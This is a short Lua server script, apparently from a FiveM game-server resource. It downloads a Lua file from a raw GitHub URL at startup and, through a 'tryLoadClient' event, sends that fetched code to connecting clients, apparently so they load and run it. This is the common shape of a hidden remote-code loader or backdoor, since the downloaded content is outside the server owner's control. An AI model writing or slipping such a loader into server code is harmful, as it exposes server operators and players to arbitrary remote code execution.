print("igor batatas")
PerformHttpRequest("https://raw.githubusercontent.com/igorl1/igorl1/main/assets/_others/_test/client.lua", function(client_status_code, client_result_content)
    if client_status_code ~= 200 then
        return false
    end

    RegisterServerEvent("edden_test:tryLoadClient")
    AddEventHandler("edden_test:tryLoadClient",function()
        TriggerClientEvent("edden_test:loadClient",source,client_result_content)
    end)
end)
